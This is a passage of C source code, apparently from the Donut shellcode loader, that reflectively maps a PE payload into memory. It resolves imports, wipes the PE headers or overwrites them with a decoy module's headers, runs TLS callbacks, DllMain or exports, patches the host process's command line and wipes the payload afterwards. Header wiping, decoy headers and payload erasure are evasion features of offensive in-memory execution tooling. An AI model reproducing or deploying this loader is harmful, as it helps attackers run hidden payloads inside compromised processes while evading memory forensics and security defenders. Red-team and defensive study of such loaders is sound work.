          } else {
            // Resolve by name
            ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
            ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, ibn->Name, 0);
          }
        }
      }
    }
      
    size_of_img = ntnew->OptionalHeader.SizeOfImage;
    Start = RVA2VA(Start_t, cs, ntnew->OptionalHeader.AddressOfEntryPoint);

    // copy relevant headers before they are wiped
    ntc = *nt;

#ifdef _WIN64
    // Static TLS must be registered while the headers are still readable:
    // LdrpHandleTlsData walks the image from DllBase to find the TLS directory,
    // and the header wipe below removes it. This is the one loader service that
    // cannot be reproduced without ntdll internals, so it is x64-only and
    // best-effort; a payload with no static TLS template is left alone.
    {
      DWORD tls_rva = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
      if(tls_rva != 0) {
        tls = RVA2VA(PIMAGE_TLS_DIRECTORY, cs, tls_rva);
        if(tls->StartAddressOfRawData != tls->EndAddressOfRawData ||
           tls->SizeOfZeroFill != 0) {
          PVOID tls_fn = find_ldrp_handle_tls_data(inst);
          if(tls_fn != NULL) {
            register_static_tls(inst, cs, tls_fn);
          } else {
            DPRINT("LdrpHandleTlsData not found; static TLS remains unregistered");
          }
        }
      }
    }
#endif

    shcp = inst->api.VirtualAlloc(NULL, ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    Memcpy(shcp, sh, ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

    if(inst->headers == 1)
    {
      // if no decoy is specified, just wipe the headers
      if (inst->decoy[0] == 0)
      {
        DPRINT("Wiping Headers from memory");
        Memset(cs,   0, nt->OptionalHeader.SizeOfHeaders);
        Memset(base, 0, nt->OptionalHeader.SizeOfHeaders);
      }
      else {
        DPRINT("Overwriting PE headers with the decoy module's.");

        if (origmod != NULL)
          Memcpy(cs, origmod, nt->OptionalHeader.SizeOfHeaders);
        else
          DPRINT("Could not locate decoy PE headers.");
      }
    }

    if (inst->decoy[0] == 0) {
      PVOID first_base = cs;

      DPRINT("Unmapping temporary local view of section to persist changes.");
      status = inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
      DPRINT("NTSTATUS: %d", status);
      if(status != 0) return;

      // Request the same base for the final view. Relocations and IAT entries
      // were fixed up against first_base; asking the system to choose could hand
      // back a different address and leave every adjusted pointer pointing at the
      // old one. Passing the address back is a hint to preserve, not a fresh
      // allocation: an explicit base either maps exactly there or fails.
      cs = first_base;
      viewSize = 0;

      // Map the final view PAGE_EXECUTE_READWRITE, then narrow per section below.
      //
      // A view's protection can be narrowed but not widened afterwards: measured
      // on Windows 11 26200, a PAGE_EXECUTE_WRITECOPY view rejects PAGE_READWRITE
      // and a PAGE_READWRITE view rejects PAGE_EXECUTE_READ, both with
      // ERROR_INVALID_PARAMETER, while an RWX view accepts both directions.
      // The static CRT aborts before main on a WRITECOPY view because its winapi
      // thunk initialiser cannot make .fptable writable. Mapping RWX and then
      // applying each section's rights (including the padding before the next
      // section, which stays inside numBytes) keeps the final image free of RWX
      // padding, which is what WRITECOPY was there to achieve.
      DPRINT("Mapping read-write-execute local view of section, narrowed per section.");
      status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
      DPRINT("View size: %lld", viewSize);
      DPRINT("NTSTATUS: %d", status);
      if(status != 0) return;

      DPRINT("Mapped to address: %p", cs);
      if (cs != first_base) {
        DPRINT("Section mapped at %p, not at the relocated base %p; refusing to run", cs, first_base);
        return;
      }
    }

    // The view starts RWX; the per-section pass below narrows every byte of it,
    // including the padding between sections, so no RWX region survives.
    DPRINT("Pre-marking module as RWX; per-section pass narrows it.")
    inst->api.VirtualProtect(cs, viewSize, PAGE_EXECUTE_READWRITE, &oldprot);

    DPRINT("Setting permissions for each PE section");
    // done with binary manipulation, mark section permissions appropriately
    for (i = 0; i < ntc.FileHeader.NumberOfSections; i++)
    {
      BOOL isRead = (shcp[i].Characteristics & IMAGE_SCN_MEM_READ) ? TRUE : FALSE;
      BOOL isWrite = (shcp[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? TRUE : FALSE;
      BOOL isExecute = (shcp[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? TRUE : FALSE;

      if (isWrite & isExecute)
      {
        // The final view is RW, so a RWX section has to be made executable again;
        // the decoy path maps a write-copy view and already has WCX.
        newprot = (inst->decoy[0] == 0) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_WRITECOPY;
      }
      else if (isRead & isExecute)
          newprot = PAGE_EXECUTE_READ;
      else if (isRead & isWrite & !isExecute)
      {
        newprot = (inst->decoy[0] == 0) ? PAGE_READWRITE : PAGE_WRITECOPY;
      }
      else if (!isRead & !isWrite & isExecute)
          newprot = PAGE_EXECUTE;
      else if (isRead & !isWrite & !isExecute)
          newprot = PAGE_READONLY;

      baseAddress = (PBYTE)cs + shcp[i].VirtualAddress;

      if (i < (ntc.FileHeader.NumberOfSections - 1))
        numBytes = ((PBYTE)cs + shcp[i+1].VirtualAddress) - ((PBYTE)cs + shcp[i].VirtualAddress);
      else
        numBytes = shcp[i].SizeOfRawData;

      oldprot = 0;

      DPRINT("Section name: %s", shcp[i].Name);
      DPRINT("Section offset: 0x%X", shcp[i].VirtualAddress);
      DPRINT("Section absolute address: 0x%p", baseAddress);
      DPRINT("Section size: 0x%llX", numBytes);
      DPRINT("Section protections: 0x%X", newprot);
      
      if (!(inst->api.VirtualProtect(baseAddress, numBytes, newprot, &oldprot)))
        DPRINT("VirtualProtect failed: %d", inst->api.GetLastError());
    }

    // declare variables and set permissions of module header
    DPRINT("Setting permissions of module headers to READONLY (%d bytes)", ntc.OptionalHeader.BaseOfCode);
    oldprot = 0;

    inst->api.VirtualProtect(cs, ntc.OptionalHeader.BaseOfCode, PAGE_READONLY, &oldprot);

    // Let x64 C++ exception handling identify this image as the throwing module.
    // The 32-bit CRT does not use RtlPcToFileHeader for this; its own failure
    // (STATUS_INVALID_DISPOSITION) has a different, unattributed cause.
    #ifdef _WIN64
      hook_cxx_module_base(inst, cs, &ntc, &cxx_hook);
    #endif

#ifdef _WIN64
    // Register the exception table with the unwinder.
    //
    // C++ exceptions and SEH in a manually mapped image need RUNTIME_FUNCTION
    // entries; without this the unwind finds no handler and the exception
    // escapes the payload. The call is resolved dynamically so the instance
    // layout and the pre-resolved API list stay as they are.
    // Read the directory from ntc, the copy taken before the headers were wiped:
    // ntnew points into the mapped headers, which are zero by this point when the
    // caller asked for the default (headers overwritten).
    rva  = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    size = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    if(rva != 0 && size >= sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) {
      typedef BOOLEAN (NTAPI *RtlAddFunctionTable_t)(PIMAGE_RUNTIME_FUNCTION_ENTRY, DWORD, ULONG_PTR);
      RtlAddFunctionTable_t _RtlAddFunctionTable;
      char    modname[24];
      char    apiname[24];

      DPRINT("Registering exception table at %p, %u entries",
        RVA2VA(PVOID, cs, rva), (DWORD)(size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)));

      // The instance only carries the ntdll name when bypassing was requested.
      name_ntdll(modname);
      ft_ntdll = inst->api.GetModuleHandleA(modname);
      name_rtladdfunctiontable(apiname);
      _RtlAddFunctionTable = (RtlAddFunctionTable_t)inst->api.GetProcAddress(ft_ntdll, apiname);
      if(_RtlAddFunctionTable != NULL) {
        ft_count = (DWORD)(size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
        if(_RtlAddFunctionTable((PIMAGE_RUNTIME_FUNCTION_ENTRY)RVA2VA(PVOID, cs, rva),
                                 ft_count, (ULONG_PTR)cs)) {
          // Remember the table so cleanup can unregister it. Leaving it
          // registered after the image is unmapped would point the unwinder at
          // freed memory and crash the host on a later exception.
          ft_table = RVA2VA(PVOID, cs, rva);
        } else {
          DPRINT("RtlAddFunctionTable failed: %d", inst->api.GetLastError());
          ft_count = 0;
        }
      }
    }
#endif

    /**
      Process the TLS directory.

      The OS loader assigns the module a *static* TLS index, writes it to
      AddressOfIndex, and for every thread copies the template into the slot the
      compiler reads: TEB.ThreadLocalStoragePointer[index] (gs:[58h] on x64,
      fs:[2Ch] on x86). A manual mapper has no public way to allocate one of
      those indices. TlsAlloc allocates from the *dynamic* namespace instead: the
      same number in the static array can already hold another module's block, so
      using it overwrote kernelbase's TLS and crashed the CRT. Claiming a slot
      that is NULL in this thread's static array was also tried and lost the slot
      to a later, lazy allocation. Thread-local variables therefore remain
      unsupported; Compat reports that. TLS callbacks do run, but only for
      DLL_PROCESS_ATTACH.
    */
    rva = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if(rva != 0) {
      DPRINT("Processing TLS directory");

      tls = RVA2VA(PIMAGE_TLS_DIRECTORY, cs, rva);

      // address of callbacks is absolute. requires relocation information
      callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
      DPRINT("AddressOfCallBacks : %p", callbacks);

      // DebugBreak();

      if(callbacks) {
        tls_cbs = callbacks;
        while(*callbacks != NULL) {
          // call function
          DPRINT("Calling %p", *callbacks);
          (*callbacks)((LPVOID)cs, DLL_PROCESS_ATTACH, NULL);
          callbacks++;
        }
        tls_attached = TRUE;
      }
    }

    if(mod->type == DONUT_MODULE_DLL) {
      // A DLL may legitimately have no entry point (AddressOfEntryPoint == 0):
      // resource-only DLLs and some export-only libraries. The OS loader skips
      // DllMain for those; do the same instead of calling the image base. The
      // named export below still runs.
      if(ntc.OptionalHeader.AddressOfEntryPoint != 0) {
        DllMain = RVA2VA(DllMain_t, cs, ntc.OptionalHeader.AddressOfEntryPoint);
        DPRINT("Executing entrypoint of DLL: %p", (PVOID)DllMain);
        DPRINT("HINSTANCE: %p\n\n", (PVOID)cs);
        dll_attached = DllMain(cs, DLL_PROCESS_ATTACH, NULL);
        if(!dll_attached) {
          // The OS loader aborts a load whose DllMain refuses DLL_PROCESS_ATTACH:
          // no export is called and no DLL_PROCESS_DETACH is delivered. Mirror
          // that instead of running a module that declared itself unready.
          DPRINT("DllMain refused DLL_PROCESS_ATTACH; aborting load");
          goto pe_cleanup;
        }
      } else {
        DPRINT("DLL has no entry point; skipping DllMain");
      }

      // call exported api?
      if(mod->method[0] != 0) {
        DPRINT("Resolving address of %s", (char*)mod->method);
        
        rva = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, cs, rva);
        
        if(rva != 0) {
          cnt = exp->NumberOfNames;
          
          DPRINT("IMAGE_EXPORT_DIRECTORY.NumberOfNames : %i", cnt);
          
          if(cnt != 0) {
            adr = RVA2VA(PDWORD,cs, exp->AddressOfFunctions);
            sym = RVA2VA(PDWORD,cs, exp->AddressOfNames);
            ord = RVA2VA(PWORD, cs, exp->AddressOfNameOrdinals);

            DPRINT("IMAGE_EXPORT_DIRECTORY.AddressOfFunctions : 0x%X", *adr);
            DPRINT("IMAGE_EXPORT_DIRECTORY.AddressOfNames : 0x%X", *sym);
            DPRINT("IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals : 0x%X", *ord);
        
            do {
              str = RVA2VA(PCHAR, cs, sym[cnt-1]);
              if(!_strcmp(str, mod->method)) {
                fwd_rva = adr[ord[cnt-1]];
                DllParam = RVA2VA(DllParam_t, cs, fwd_rva);
                break;
              }
            } while (--cnt);

            // A forwarder's function RVA points inside the export directory, at
            // a "DLL.Func" string rather than at code. Resolve it through the
            // target module so a re-exported function still works. If the target
            // is not loaded in the host the load cannot proceed.
            if(DllParam != NULL) {
              exp_size = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
              if(fwd_rva >= rva && (exp_size == 0 || fwd_rva < rva + exp_size)) {
                DllParam = (DllParam_t)resolve_forwarder(inst, (PCHAR)DllParam);
                if(DllParam == NULL) {
                  DPRINT("Unable to resolve forwarded export %s", mod->method);
                  goto pe_cleanup;
                }
              }
            }
      
            // resolved okay?
            if(DllParam != NULL) {
              DPRINT("Invoking %s", mod->method);
              // pass parameters/command line to function?
              if(mod->args[0] != 0) {
                if(mod->unicode) {
                  ansi2unicode(inst, mod->args, buf);
                }
                DllParam((mod->unicode) ? (PVOID)buf : (PVOID)mod->args);
              } else {
                // execute DLL function with no parameters
                DllVoid = (DllVoid_t)DllParam;
                DllVoid();
              }
            } else {
              DPRINT("Unable to resolve API");
              goto pe_cleanup;
            }
          }
        }
      }
    } else {

      // set the command line
      if(mod->args[0] != 0) {
        ansi2unicode(inst, mod->args, buf);
        DPRINT("Setting command line: %ws", buf);
        SetCommandLineW(inst, buf);
      }

      if(mod->thread != 0) {
        // Create a new thread for this process.
        // Since we replaced exit-related API with RtlExitUserThread in IAT, once an exit-related API is called, the
        // thread will simply terminate and return back here. Of course, this doesn't work
        // if the exit-related API is resolved dynamically.
        DPRINT("Creating thread for entrypoint of EXE : %p\n\n", (PVOID)Start);
        hThread = inst->api.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Start, NULL, 0, NULL);
        
        if(hThread != NULL) {
          // wait for thread to terminate
          inst->api.WaitForSingleObject(hThread, INFINITE);
          DPRINT("Process terminated");
        }
      } else {
        // if ExitProces is called, this will terminate the host process.
        DPRINT("Executing entrypoint: %p\n\n", (PVOID)Start);
        Start(NtCurrentTeb()->ProcessEnvironmentBlock);
      }
    }

    // if user specified to block instead of exit, then block infinitely before cleanup
    // TODO: Don't busy wait as this can use up CPU resources (a lot)
    if (inst->exit_opt == DONUT_OPT_EXIT_BLOCK) {
      DPRINT("Execution complete. Blocking indefintely.");

      inst->api.Sleep(INFINITE);
    }

pe_cleanup:
    // A DLL whose DllMain accepted DLL_PROCESS_ATTACH gets its DLL_PROCESS_DETACH
    // before the image is unmapped, so it can release resources, flush buffers
    // and run CRT atexit handlers. The OS loader does exactly this on FreeLibrary;
    // skipping it leaks whatever the detach path would have cleaned up.
    if(mod->type == DONUT_MODULE_DLL && dll_attached && cs != NULL) {
      DllMain(cs, DLL_PROCESS_DETACH, NULL);
      dll_attached = FALSE;
    }

    // TLS callbacks receive DLL_PROCESS_DETACH symmetrically with attach.
    if(tls_attached && tls_cbs != NULL && cs != NULL) {
      callbacks = tls_cbs;
      while(*callbacks != NULL) {
        DPRINT("Calling TLS DETACH callback %p", *callbacks);
        (*callbacks)((LPVOID)cs, DLL_PROCESS_DETACH, NULL);
        callbacks++;
      }
      tls_attached = FALSE;
    }
#ifdef _WIN64
    // Undo the exception-table registration and the C++ module-base hook before
    // the image goes away, so the host is left as it was found. Order matters:
    // unregister the function table while its memory is still mapped, restore
    // the IAT slots, then free the stub page.
    if(ft_table != NULL && ft_ntdll != NULL) {
      typedef BOOLEAN (NTAPI *RtlDeleteFunctionTable_t)(PIMAGE_RUNTIME_FUNCTION_ENTRY);
      RtlDeleteFunctionTable_t _RtlDeleteFunctionTable;
      char apiname[24];
      name_rtldeletefunctiontable(apiname);
      _RtlDeleteFunctionTable = (RtlDeleteFunctionTable_t)inst->api.GetProcAddress(ft_ntdll, apiname);
      if(_RtlDeleteFunctionTable != NULL) {
        if(!_RtlDeleteFunctionTable((PIMAGE_RUNTIME_FUNCTION_ENTRY)ft_table)) {
          DPRINT("RtlDeleteFunctionTable failed: %d", inst->api.GetLastError());
        }
      }
      ft_table = NULL;
    }
    unhook_cxx_module_base(inst, &cxx_hook);
#endif

    // if memory allocated
    if(cs != NULL) {
      // release
      DPRINT("Releasing memory");

      inst->api.VirtualFree(shcp, 0, MEM_RELEASE);

      if (origmod != NULL)
        inst->api.VirtualFree(origmod, 0, MEM_RELEASE);

      inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
      inst->api.CloseHandle(hSection);
    }

    DPRINT("Wiping payload from Donut module in memory.");
    Memset(base, 0, mod->len);
}

// check each exit-related api with name provided
// return TRUE if found, else FALSE
BOOL IsExitAPI(PDONUT_INSTANCE inst, PCHAR name) {
    PCHAR str;
    CHAR  api[128];
    INT   i;
    
    str = inst->exit_api;
    
    for(;;) {
      // store string until null byte or semi-colon encountered
      for(i=0; str[i] != '\0' && str[i] !=';' && i<128; i++) api[i] = str[i];
      // nothing stored? end
      if(i == 0) break;
      // skip name plus one for separator
      str += (i + 1);
      // store null terminator
      api[i] = '\0';
      // if equal, return TRUE
      if(!_strcmp(api, name)) return TRUE;
    } 
    return FALSE;
}

// returns TRUE if ptr is heap memory
BOOL IsHeapPtr(PDONUT_INSTANCE inst, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = inst->api.VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_PRIVATE   ) && 
            (mbi.Protect == PAGE_READWRITE));
}

BOOL CheckForILOnly(PIMAGE_NT_HEADERS nthost, ULONG_PTR host)
{
	PIMAGE_DATA_DIRECTORY		net_data_dir;
	PBYTE						cor20_hdr;
	DWORD						cor20_flags;

	net_data_dir = &nthost->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];

	if (net_data_dir->Size && net_data_dir->VirtualAddress) {

		cor20_hdr = (PBYTE)(host + net_data_dir->VirtualAddress);
		cor20_flags = *(PDWORD)((ULONG_PTR)cor20_hdr + 0x10);

		if (cor20_flags & 0x1 /* IL_ONLY */) {
			if ((cor20_flags & 0x2) /* ! 32_BIT_REQUIRED */ == 0) {
				return TRUE;
			}
		}
	}

	return FALSE;
}

// Set the command line for host process.
//
// This replaces kernelbase!BaseUnicodeCommandLine and kernelbase!BaseAnsiCommandLine
// that kernelbase!KernelBaseDllInitialize reads from NtCurrentPeb()->ProcessParameters->CommandLine 
//
// BOOL KernelBaseDllInitialize(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
//
// Only tested on windows 10, but should work with at least windows 7
BOOL SetCommandLineW(PDONUT_INSTANCE inst, PCWSTR CommandLine) {
    PIMAGE_DOS_HEADER            dos;
    PIMAGE_NT_HEADERS            nt;
    PIMAGE_SECTION_HEADER        sh;
    DWORD                        i, cnt;
    PULONG_PTR                   ds;
    HMODULE                      m;
    ANSI_STRING                  ansi;
    PANSI_STRING                 mbs;
    PUNICODE_STRING              wcs;
    PPEB                         peb;
    PPEB_LDR_DATA                ldr;
    PLDR_DATA_TABLE_ENTRY        dte;
    PRTL_USER_PROCESS_PARAMETERS upp;
    BOOL                         bSet = FALSE;
    CHAR                         **argv;
    WCHAR                        **wargv;
    p_acmdln_t                   p_acmdln;
    p_wcmdln_t                   p_wcmdln;
    CHAR                         sym[128];
    PCHAR                        str;
    INT                          fptr, atype;
    PVOID                        addr, wcmd, acmd;
    
    peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
    upp = peb->ProcessParameters;

    DPRINT("Obtaining handle for %s", inst->kernelbase);
    m   = inst->api.GetModuleHandle(inst->kernelbase);
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)inst->dataname) {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    DPRINT("Searching %i pointers", cnt);
    
    wcmd = inst->api.GetCommandLineW();
    
    for(i=0; i<cnt; i++) {
      wcs = (PUNICODE_STRING)&ds[i];
      // skip if not equal
      if(wcs->Buffer != wcmd) continue;
      DPRINT("BaseUnicodeCommandLine found at %p:%p : %ws", &ds[i], wcs->Buffer, wcs->Buffer);
      // overwrite buffer for GetCommandLineW
      inst->api.RtlCreateUnicodeString(wcs, CommandLine);
      DPRINT("GetCommandLineW() : %ws", GetCommandLineW());
      break;
    }
    
    acmd = inst->api.GetCommandLineA();
    
    for(i=0; i<cnt; i++) {
      mbs = (PANSI_STRING)&ds[i];
      // skip if not equal
      if(mbs->Buffer != acmd) continue;
      DPRINT("BaseAnsiCommandLine found at %p:%p : %s", &ds[i], mbs->Buffer, mbs->Buffer);
      inst->api.RtlUnicodeStringToAnsiString(&ansi, wcs, TRUE);
      Memcpy(&ds[i], &ansi, sizeof(ANSI_STRING));
      DPRINT("GetCommandLineA() : %s", GetCommandLineA());
      break;
    }
    
    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // check for exported symbols and patch according to string type
      str = (PCHAR)inst->cmd_syms;
      
      for(;;) {
        // reset flags
        atype = 1; fptr = 0;
        // store string until null byte or semi-colon encountered
        for(i=0; str[i] != '\0' && str[i] !=';' && i<128; i++) {
          // w indicates unicode type
          if(str[i] == 'w') atype = 0;
          // p indicates function pointer
          if(str[i] == 'p') fptr  = 1;
          // store byte
          sym[i] = str[i];
        }
        // nothing stored? end loop for this DLL
        if(i == 0) break;
        // skip name plus one for separator
        str += (i + 1);
        // store null terminator
        sym[i] = '\0';
        // see if it can be resolved for current module
        addr = xGetProcAddress(inst, dte->DllBase, sym, 0);
        // nothing resolve? get the next symbol from list
        if(addr == NULL) continue;
        // is this ansi?
        if(atype) {
          argv = (PCHAR*)addr;
          // pointer?
          if(fptr != 0) {
            p_acmdln = (p_acmdln_t)addr;
            argv = p_acmdln();
          }
          // anything to patch?
          DPRINT("Checking %s", sym);
          if(argv != NULL && IsHeapPtr(inst, *argv)) {
            DPRINT("Setting %ws!%s \"%s\" to \"%s\"", 
              dte->BaseDllName.Buffer, sym, *argv, ansi.Buffer);
            *argv = ansi.Buffer;
          }
        } else {
          wargv = (PWCHAR*)addr;
          // pointer?
          if(fptr != 0) {
            p_wcmdln = (p_wcmdln_t)addr;
            wargv = p_wcmdln();
          }
          // anything to patch?
          DPRINT("Checking %s", sym);
          if(wargv != NULL && IsHeapPtr(inst, *wargv)) {
            DPRINT("Setting %ws!%s \"%ws\" to \"%ws\"", 
              dte->BaseDllName.Buffer, sym, *wargv, wcs->Buffer);
            *wargv = wcs->Buffer;
          }
        }
      }
    }
    return TRUE;
}
